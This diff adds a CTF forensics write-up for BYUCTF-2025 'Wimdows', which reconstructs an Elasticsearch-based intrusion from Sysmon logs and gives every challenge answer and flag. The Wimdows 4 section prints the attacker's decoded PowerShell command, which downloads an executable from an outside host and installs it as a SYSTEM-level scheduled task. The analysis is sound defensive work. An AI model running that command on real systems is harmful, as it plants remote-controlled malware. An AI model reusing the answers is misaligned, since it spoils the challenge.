@@ -9,27 +9,463 @@ image: './banner.webp'
 Wimdows was the biggest Forensics challenge in BYUCTF-2025. I'm giving it its own section because it has many parts and teaches important skills. While this scenario is unlikely in real life, it still provides educational value. I'll do a more in-depth analysis for this challenge than the others.
 
 This challenge involves analyzing a virtual machine image (~10GB) containing a Windows system with various forensic artifacts. Due to the large file size, I can't include the VM image here.
+### Reconnaissance
+Firing up the VM revealed a `Windows Server 2008 R2` installation with multiple accounts. The provided credentials were `vagrant/vagrant`.
+
+![alt text](../../../assets/images/BYUCTF-2025/Wimdows/startup.png)
+
+After logging in, I conducted a thorough reconnaissance of the Windows system by exploring the file system, examining user folders, checking running services, and analyzing active processes to understand the environment.
+
+To capture all running processes, I executed the following PowerShell command:
+To capture all running processes, I executed the following PowerShell command:
+```powershell
+Get-Process | Out-File -FilePath processes.txt; notepad processes.txt
+```
+
+The output revealed numerous processes running on the system:
+
+```bash
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
+-------  ------    -----      -----     ------     --  -- -----------                                                  
+     28       5     2768       3560       0.02   1476   0 cmd 
+     29       5     2712       3296       0.00   3752   0 cmd 
+     35       5     1628       3284       0.02   1320   0 conhost 
+     33       5     1556       3196       0.02   1396   0 conhost
+     35       5     1592       3252       0.00   1492   0 conhost 
+     35       5     1608       3284       0.00   1656   0 conhost 
+     37       5     1624       3324       0.00   1928   0 conhost 
+     33       5     1596       3244       0.00   2176   0 conhost 
+     33       5     1596       3272       0.02   2360   0 conhost 
+     33       5     1596       3272       0.00   2512   0 conhost 
+     32       4     1516       3168       0.00   2560   0 conhost  
+     35       5     2524       4684       0.02   5764   1 conhost  
+   1331      16     2944       5020       0.34    372   0 csrss     
+    190      11     9264       9040       0.83    420   1 csrss    
+    106       7     8260       7112       0.02   2128   0 cygrunsrv 
+     98      12     2520       4032       0.02   2008   0 dcnotificationserver 
+     47       7     1396       3752       0.00   2352   0 dcrotatelogs 
+     47       7     1392       3752       0.00   2504   0 dcrotatelogs 
+    127      21     5504      11304       0.55   1040   0 dcserverhttpd 
+    538      92    16528      17096       0.50   2392   0 dcserverhttpd  
+    102      10     2572       6140       0.02   5232   1 DesktopCentral  
+    215      16     5000      11992       0.23   4940   0 dllhost       
+    170      25    25192      16096       0.03   1336   0 domain1Service  
+   1106     177   406376     196020       7.08   1388   0 elasticsearch-service-x64   
+    650      43    22828      42072       0.72    508   1 explorer 
+    134      19     8452      13744       0.05   3388   0 httpd  
+    177      33    10100      14132       0.03   3732   0 httpd  
+      0       0        0         24                 0   0 Idle  
+    301      21   184160      64112       2.22   1564   0 java   
+    660      21   414312      43452       0.91   1596   0 java  
+   1105      54   411084     291884      14.42   2528   0 java  
+    277      20   108012      23808       0.31   4040   0 java   
+    798      58   414748     260320      14.70   4400   0 java  
+    409      51    61484      51564       4.16   1452   0 jenkins  
+    278      43    64424      50596       1.89   1912   0 jmx   
+    637      20     8060      14272       0.61    524   0 lsass  
+    210      11     3584       6440       0.05    532   0 lsm  
+    163      18     4020       8500       0.05   5032   0 msdtc 
+    553      14   184280      44176       0.14   3420   0 mysqld  
+    384      28    59700      58796       0.36   5740   1 powershell  
+    298      14     5992       9804       0.50    500   0 services 
+     36       1      712       1384       0.34    284   0 smss  
+    172      15     4524       7740       0.11   2264   0 snmp  
+    310      20     7160      11576       0.02   1160   0 spoolsv  
+    167       8     2996       8752       1.47   4600   0 sppsvc  
+    105      10     7272       6820       0.03   2192   0 sshd  
+    306      33     9300      11332       0.06    404   0 svchost 
+    383      14     5072      10464       0.31    628   0 svchost 
+    309      16     4300       8304       0.13    712   0 svchost
+    319      16    12016      13492       0.33    808   0 svchost
+   1115      47    22612      37512       1.66    852   0 svchost
+    533      20     7336      13440       1.27    920   0 svchost
+    226      14     4540       9784       0.02    964   0 svchost 
+    421      32    14724      15708       0.17   1004   0 svchost 
+    111      10     5272       9740       0.06   1208   0 svchost 
+    152      16     5728       9836       0.03   1428   0 svchost  
+     57       4     1496       3264       0.00   2236   0 svchost 
+    163      14     7620      10916       0.06   3480   0 svchost
+    253      13     3328       7312       0.02   4576   0 svchost 
+    119      13     2420       5912       0.00   4684   0 svchost
+     77       6     2224       4992       0.02   4976   0 svchost
+    275      17     7892      13668       1.16   2296   0 Sysmon64 
+    400       0      108        300      18.92      4   0 System 
+    113       8     2680       5796       0.03    644   0 taskeng
+     97       7     2564       5716       0.00   5624   1 taskeng 
+    105       8     2748       4600       0.00   5356   1 taskhost 
+     81       7     1936       5340       0.00   4132   0 unsecapp 
+     58       9    20572       4268       0.02   1112   0 update
+     98      12     3500       9824       0.09   2436   0 VGAuthService
+    284      23    10752      18024       0.17   2600   0 vmtoolsd 
+    178      19     8248      15620       0.16   5820   1 vmtoolsd 
+     93      10     2060       4860       0.09    412   0 wininit 
+    109       7     2532       5772       0.05    476   1 winlogon 
+     51       6     1584       3912       0.03   3508   0 wlms 
+    230      15     7628      13124       0.47   4896   0 WmiPrvSE 
+    267      17    22520      27468       1.61   5376   0 WmiPrvSE 
+    277      18     4328       8208       0.06   1236   0 wrapper
+```
+
+Notable observations from the process list:
+- Multiple instances of `java` with high memory usage
+- Presence of `elasticsearch-service-x64`, `jenkins`, and `jmx` services
+- Several web servers including `httpd`
+- `Sysmon64` running, which could provide valuable event logs
+- High number of `svchost` instances typical for Windows servers
+
+Next, I enumerated the running services to gain deeper insight into the system's functionality:
+
+```powershell
+Get-Service | Where-Object { $_.Status -eq 'Running' } | Out-File running_services.txt; notepad running_services.txt
+```
+
+The output confirmed the presence of several interesting services:
+
+```text
+Status   Name               DisplayName                           
+------   ----               -----------                           
+Running  AppHostSvc         Application Host Helper Service       
+Running  BFE                Base Filtering Engine                 
+Running  BITS               Background Intelligent Transfer Ser...
+Running  CertPropSvc        Certificate Propagation               
+Running  COMSysApp          COM+ System Application               
+Running  CryptSvc           Cryptographic Services                
+Running  DcomLaunch         DCOM Server Process Launcher          
+Running  DesktopCentralS... ManageEngine Desktop Central Server   
+Running  Dhcp               DHCP Client                           
+Running  Dnscache           DNS Client                            
+Running  domain1            domain1 GlassFish Server              
+Running  DPS                Diagnostic Policy Service             
+Running  elasticsearch-s... Elasticsearch 1.1.1 (elasticsearch-...
+Running  eventlog           Windows Event Log                     
+Running  EventSystem        COM+ Event System                     
+Running  fdPHost            Function Discovery Provider Host      
+Running  FontCache          Windows Font Cache Service            
+Running  ftpsvc             Microsoft FTP Service                 
+Running  gpsvc              Group Policy Client                   
+Running  IKEEXT             IKE and AuthIP IPsec Keying Modules   
+Running  iphlpsvc           IP Helper                             
+Running  jenkins            jenkins                               
+Running  jmx                jmx                                   
+Running  LanmanServer       Server                                
+Running  LanmanWorkstation  Workstation                           
+Running  lmhosts            TCP/IP NetBIOS Helper                 
+Running  MEDC Server Com... MEDC Server Component - Notificatio...
+Running  MEDCServerCompo... MEDC Server Component - Apache        
+Running  MpsSvc             Windows Firewall                      
+Running  MSDTC              Distributed Transaction Coordinator   
+Running  Netman             Network Connections                   
+Running  netprofm           Network List Service                  
+Running  NlaSvc             Network Location Awareness            
+Running  nsi                Network Store Interface Service       
+Running  OpenSSHd           OpenSSH Server                        
+Running  PlugPlay           Plug and Play                         
+Running  PolicyAgent        IPsec Policy Agent                    
+Running  Power              Power                                 
+Running  ProfSvc            User Profile Service                  
+Running  RemoteRegistry     Remote Registry                       
+Running  RpcEptMapper       RPC Endpoint Mapper                   
+Running  RpcSs              Remote Procedure Call (RPC)           
+Running  SamSs              Security Accounts Manager             
+Running  Schedule           Task Scheduler                        
+Running  SENS               System Event Notification Service     
+Running  SessionEnv         Remote Desktop Configuration          
+Running  ShellHWDetection   Shell Hardware Detection              
+Running  SNMP               SNMP Service                          
+Running  Spooler            Print Spooler                         
+Running  sppsvc             Software Protection                   
+Running  Sysmon64           Sysmon64                              
+Running  TermService        Remote Desktop Services               
+Running  TrkWks             Distributed Link Tracking Client      
+Running  UmRdpService       Remote Desktop Services UserMode Po...
+Running  UxSms              Desktop Window Manager Session Manager
+Running  VGAuthService      VMware Alias Manager and Ticket Ser...
+Running  VMTools            VMware Tools                          
+Running  W3SVC              World Wide Web Publishing Service     
+Running  wampapache         wampapache                            
+Running  wampmysqld         wampmysqld                            
+Running  WAS                Windows Process Activation Service    
+Running  WdiSystemHost      Diagnostic System Host                
+Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
+Running  Winmgmt            Windows Management Instrumentation    
+Running  WinRM              Windows Remote Management (WS-Manag...
+Running  WLMS               Windows Licensing Monitoring Service  
+Running  wuauserv           Windows Update                        
+```
+
+Several security-relevant services caught my attention:
+- `RemoteRegistry` service (typically disabled for security reasons)
+- Multiple web servers (`wampapache`, `W3SVC`)
+- Enterprise applications (`jenkins`, `elasticsearch`, `GlassFish`)
+- Management tools (`DesktopCentralServer`, `SNMP`)
+
+To further investigate potential artifacts, I examined the `C:\Windows\Temp` directory, which often contains valuable forensic evidence:
+
+```powershell
+PS C:\Windows\Temp> Get-ChildItem -Path "C:\Windows\Temp" -Recurse -Force | Out-File "$env:USERPROFILE\Desktop\temp_list.txt"
+
+ Directory: C:\Windows\Temp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         8/5/2022   2:50 PM                chocolatey                                                            
+d-----         8/5/2022   2:03 PM                Crashpad                                                              
+d-----         8/5/2022   3:06 PM                hsperfdata_sshd_server                                                
+d-----        5/22/2025  11:16 PM                hsperfdata_VAGRANT-2008R2$                                            
+d-----         8/5/2022   3:05 PM                Low                                                                   
+d-----         8/5/2022   3:06 PM                virtualbox                                                            
+d-----        5/22/2025  11:16 PM                VM3D                                                                  
+d-----        5/17/2025   6:57 PM                vmware-SYSTEM                                                         
+d-----         8/5/2022   3:05 PM                {699DC2F0-7B7E-431D-8D4E-84E5E3E5DD96}                                
+-a----         8/5/2022   3:06 PM       18487658 axis2-1.6.0-war.zip                                                   
+-a----        5/15/2025   6:10 PM          25445 chrome_installer.log                                                  
+-a----         8/5/2022   2:49 PM         364552 dd_vcredistMSI233C.txt                                                
+-a----         8/5/2022   2:50 PM         374078 dd_vcredistMSI235A.txt                                                
+-a----         8/5/2022   2:49 PM          11626 dd_vcredistUI233C.txt                                                 
+-a----         8/5/2022   2:50 PM          11546 dd_vcredistUI235A.txt                                                 
+-a----         8/5/2022   1:42 PM              0 DMI6C94.tmp                                                           
+-a----        5/17/2025  11:31 AM              0 DMI9D49.tmp                                                           
+-a----         8/5/2022   1:44 PM           4572 dotnet-install.log                                                    
+-a----         8/5/2022   3:06 PM       22608755 elasticsearch-1.1.1.zip                                               
+-a----         8/5/2022   2:48 PM      102178360 glassfish4.zip                                                        
+-a----        5/15/2025   6:00 PM              0 ib2952.tmp                                                            
+-a----        5/15/2025   6:00 PM              0 ib2953.tmp                                                            
+-a----        5/15/2025   6:00 PM              0 ib2954.tmp                                                            
+-a----        5/15/2025   6:00 PM              0 ib2955.tmp                                                            
+-a----        5/15/2025   6:00 PM              0 ib2994.tmp                                                            
+-a----        5/17/2025   3:43 PM              0 ib3613.tmp                                                            
+-a----        5/17/2025   3:43 PM              0 ib3614.tmp                                                            
+-a----        5/17/2025   3:43 PM              0 ib3615.tmp                                                            
+-a----        5/17/2025   3:43 PM              0 ib3626.tmp                                                            
+-a----        5/17/2025   3:43 PM              0 ib3665.tmp                                                            
+-a----        5/22/2025  11:16 PM              0 ib3836.tmp                                                            
+-a----        5/22/2025  11:16 PM              0 ib3837.tmp                                                            
+-a----        5/22/2025  11:16 PM              0 ib3838.tmp                                                            
+-a----        5/22/2025  11:16 PM              0 ib3849.tmp                                                            
+-a----        5/22/2025  11:16 PM              0 ib3888.tmp                                                            
+-a----        5/17/2025   5:15 PM              0 ib3AD6.tmp                                                            
+-a----        5/17/2025   5:15 PM              0 ib3AD7.tmp                                                            
+-a----        5/17/2025   5:15 PM              0 ib3AD8.tmp                                                            
+-a----        5/17/2025   5:15 PM              0 ib3AE9.tmp                                                            
+-a----        5/17/2025   5:15 PM              0 ib3B28.tmp                                                            
+-a----        5/17/2025  11:31 AM              0 ib662C.tmp                                                            
+-a----        5/17/2025  11:31 AM              0 ib662D.tmp                                                            
+-a----        5/17/2025  11:31 AM              0 ib662E.tmp                                                            
+-a----        5/17/2025  11:31 AM              0 ib663E.tmp                                                            
+-a----        5/17/2025  11:31 AM              0 ib667E.tmp                                                            
+-a----         8/5/2022   2:57 PM      134169928 ManageEngine_DesktopCentral.exe                                       
+-a----         8/5/2022   2:50 PM       68988401 openjdk-1.6.0-unofficial-b27-windows-amd64.zip                        
+-a----         8/5/2022   1:44 PM       10225386 openssh.exe                                                           
+-a----         8/5/2022   1:44 PM             99 PATH                                                                  
+-a----        5/22/2025  11:17 PM            102 silconfig.log                                                         
+-a----         8/5/2022   2:24 PM         131072 TS_1E94.tmp                                                           
+-a----         8/5/2022   2:24 PM         196608 TS_1F60.tmp                                                           
+-a----         8/5/2022   2:30 PM         393216 TS_2639.tmp                                                           
+-a----         8/5/2022   2:30 PM         262144 TS_26B7.tmp                                                           
+-a----         8/5/2022   2:23 PM         327680 TS_2D2E.tmp                                                           
+-a----         8/5/2022   2:23 PM         393216 TS_2DBC.tmp                                                           
+-a----         8/5/2022   1:50 PM       63803392 VBoxGuestAdditions.iso                                                
+-a----        5/22/2025  11:16 PM          22171 vmware-vmsvc-SYSTEM.log                                               
+-a----        5/22/2025  11:16 PM           3063 vmware-vmtoolsd-SYSTEM.log                                            
+-a----        5/22/2025  11:19 PM           4082 vmware-vmtoolsd-vagrant.log                                           
+-a----        5/22/2025  11:19 PM          16753 vmware-vmusr-vagrant.log                                              
+-a----        5/22/2025  11:16 PM           2510 vmware-vmvss-SYSTEM.log                                               
+-a----         8/5/2022   2:42 PM       26024903 wampserver2.2.d-x64.exe                                               
+-a----         8/5/2022   1:44 PM           4880 wmf-install.log                                                       
+-a----         8/5/2022   2:50 PM           1736 _env.cmd                                                              
+-a----         8/5/2022   3:05 PM          16384 ~DF0576503D8268117D.TMP                                               
+-a----         8/5/2022   3:05 PM          16384 ~DF64A0C29C2A02D94B.TMP                                               
+-a----         8/5/2022   3:05 PM          16384 ~DF9E950B5174EDB2B5.TMP 
+```
+
+The temp directory revealed several significant findings:
+- Installation packages for various enterprise applications (Elasticsearch, GlassFish, WAMP)
+- Evidence of ManageEngine DesktopCentral software
+- VM-related files confirming this is a virtualized environment
+- Various temporary files created during recent activity (May 2025)
 
 ### Wimdows 1
-#### Description
 ![alt text](<../../../assets/images/BYUCTF-2025/Wimdows 1.png>)
 
+In the running processes, I spotted `Sysmon` which could aid me in solving these problems.
+
+First, I needed to export the logs from the VM to my computer using `VM Tools`. I then used `EvtxECmd` to convert the logs to `.csv` format, allowing me to open them in `Timeline Explorer` for easier investigation and analysis.
+
+```powershell
+danhq@hide-and-seek E:\....\EvtxeCmd .\EvtxECmd.exe -f .\Microsoft-Windows-Sysmon%4Operational.evtx --csv . --csvf Sysmon.csv
+EvtxECmd version 1.5.2.0
+
+Author: Eric Zimmerman (saericzimmerman@gmail.com)
+https://github.com/EricZimmerman/evtx
+
+Command line: -f .\Microsoft-Windows-Sysmon%4Operational.evtx --csv . --csvf Sysmon.csv
+
+Warning: Administrator privileges not found!
+
+CSV output will be saved to .\Sysmon.csv
+
+Maps loaded: 453
+
+Processing E:\CTF\Tools\EvtxeCmd\Microsoft-Windows-Sysmon%4Operational.evtx...
+Chunk count: 68, Iterating records...
+
+Event log details
+Flags: IsDirty
+Chunk count: 68
+Stored/Calculated CRC: 6A0FADAA/6A0FADAA
+Earliest timestamp: 2025-05-16 01:22:55.2258750
+Latest timestamp:   2025-05-23 06:29:44.2773437
+Total event log records found: 3,294
+
+Records included: 3,294 Errors: 0 Events dropped: 0
+
+Metrics (including dropped events)
+Event ID        Count
+1               1,744
+2               16
+4               15
+5               4
+6               28
+8               233
+11              580
+12              77
+13              596
+16              1
+
+Processed 1 file in 2.7522 seconds
+```
+Upon opening the logs in `Timeline Explorer`, I spotted these suspicious entries:
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/Sysmon log 1.png>)
+
+There are multiple PowerShell commands executed which spawned from `C:\Program Files\elasticsearch-1.1.1\bin\elasticsearch-service-x64.exe` and are encoded in base64.
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/log CVE.png>)
+
+From this evidence, I concluded that the perpetrator exploited a vulnerability in Elasticsearch to gain shell access on this computer. I had previously identified that the version of Elasticsearch running was `1.1.1`. 
+
+So I search for `Elasticsearch 1.1.1 CVE RCE` which return
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/CVE search.png>)
+
+Therefore, the answer to `Wimdows 1` is `CVE-2014-3120`
+
 ### Wimdows 2
-#### Description
 ![alt text](<../../../assets/images/BYUCTF-2025/Wimdows 2.png>)
-#### Thought Process
+
+From the same Sysmon log, I discovered additional encoded PowerShell commands executed after the perpetrator gained shell access. Upon decoding these commands, I was able to extract the second flag.
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/Powershell Wimdows 2.png>)
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/Flag Wimdows 2.png>)
+
+So the answer for `Wimdows 2` is `byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}`
+
 ### Wimdows 3
-#### Description
 ![alt text](<../../../assets/images/BYUCTF-2025/Wimdows 3.png>)
-#### Thought Process
+
+In the same log, I spotted these entries
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/wimdows 3.png>)
+
+The logs clearly show that a new user account named `phasma` was created and subsequently added to the `Remote Desktop Users` group. 
+
+Therefore, the answer to `Wimdows 3` is `Remote Desktop Users`
+
 ### Wimdows 4
-#### Description
 ![alt text](<../../../assets/images/BYUCTF-2025/Wimdows 4.png>)
-#### Thought Process
+
+Continue scavenging the Sysmon log for encoded base64 powershell command, I found this
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/update download.png>)
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/update b64 decodde.png>)
+
+```powershell
+$BINARY='C:\Windows\System32\update.exe' ; $ProgressPreference = 'SilentlyContinue' ; Invoke-WebRequest -Uri "http://192.168.1.107:8000/update.exe" -OutFile $BINARY ; schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart /rl highest ; schtasks /run /tn "updates
+```
+This revealed that the attacker downloaded a malicious executable and replaced the legitimate `C:\Windows\System32\update.exe` with this malware while maintaining the same filename to avoid detection.
+
+I extracted the `update.exe` and uploaded it to `VirusTotal` and this is the result. 
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/Virus total .png>)
+
+This is definitely malware! Examining its behavior, we can see the IP address it's trying to connect to:
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/ip virus.png>)
+
+And in Community we got the C2 framework
+
+![alt text](../../../assets/images/BYUCTF-2025/Wimdows/c2.png)
+
+So the answer to `Wimdows 4` is `Sliver_192.168.1.224`
+
 ### Wimdows 5
-#### Description
+
 ![alt text](<../../../assets/images/BYUCTF-2025/Wimdows 5.png>)
-#### Thought Process
+
+Still using the same Sysmon log I see this entries
+
+![alt text](<../../../assets/images/BYUCTF-2025/Wimdows/wimdows 5 backdoor.png>)
+
+Thus `Wimdows 5` answer is `byuctf{00p5_4ll_b4ckd00r5_139874}`
+
+
+### Summary
+
+Based on the forensic analysis of the Sysmon logs and system artifacts, I've reconstructed the complete attack flow with corresponding MITRE ATT&CK techniques:
+
+1. **Elasticsearch Vulnerability Exploitation** [T1190, T1133]
+   - The attacker exploited a critical vulnerability (CVE-2014-3120) in Elasticsearch 1.1.1
+   - Commands were executed directly through the Elasticsearch service process
+   - Evidence: Sysmon logs showing command execution from `elasticsearch-service-x64.exe`
+
+2. **PowerShell Command Execution** [T1059.001, T1027]
+   - Base64-encoded PowerShell commands were executed to evade detection
+   - Complex malicious commands were run while bypassing security controls
+   - Evidence: Multiple encoded PowerShell execution events in Sysmon logs
+
+3. **System Information Gathering** [T1082, T1087]
+   - The attacker gathered information about system configuration and user accounts
+   - This reconnaissance phase helped them plan further attack steps
+   - Evidence: Sequential nature of commands showing systematic enumeration
+
+4. **User Account Creation** [T1136.001, T1078.003]
+   - Created new user account "phasma" for persistent access
+   - Added the account to "Remote Desktop Users" group for remote access capability
+   - Evidence: Explicit account creation and group modification events in logs
+
+5. **Scheduled Task Creation** [T1053.005, T1543.003]
+   - Created scheduled task "updates" to run at system startup
+   - Configured to execute with SYSTEM privileges for maximum access
+   - Evidence: `schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart`
+
+6. **Masquerading as System File** [T1036.003, T1036.005]
+   - Replaced legitimate `C:\Windows\System32\update.exe` with malware
+   - Maintained same filename and location to avoid detection
+   - Evidence: PowerShell command showing file replacement
+
+7. **Sliver C2 Framework** [T1105, T1071]
+   - Malicious update.exe was a Sliver C2 framework implant
+   - Established communication with C2 server at 192.168.1.224
+   - Evidence: VirusTotal analysis confirming C2 communication
+
+8. **SYSTEM Level Execution** [T1548, T1134]
+   - Scheduled task ran malware with SYSTEM privileges
+   - Highest possible local permissions on the Windows system
+   - Evidence: `/ru 'SYSTEM'` parameter in scheduled task creation
+
+9. **Remote Desktop Protocol** [T1021.001]
+   - Configured RDP access via "Remote Desktop Users" group membership
+   - Created potential for movement to other systems in the network
+   - Evidence: Specific group membership modification
+
+10. **Backdoor Establishment** [T1505]
+    - Implemented a persistent backdoor for future access
+    - Replaced system accessibility executables with command shell (sticky keys backdoor technique)
+    - Revealed by flag `byuctf{00p5_4ll_b4ckd00r5_139874}`
+    - Evidence: Backdoor commands and file replacements visible in Sysmon logs
 
 ## Forensics 
 ### Are You Looking Me Up?
@@ -464,7 +900,7 @@ def getAdminOptions(username):
         adminOptions = db.json().get("admin_options", "$")[0]
     return adminOptions
 
-
+ 
 
 ### ROUTES ###
 @app.route('/', methods=['GET'])
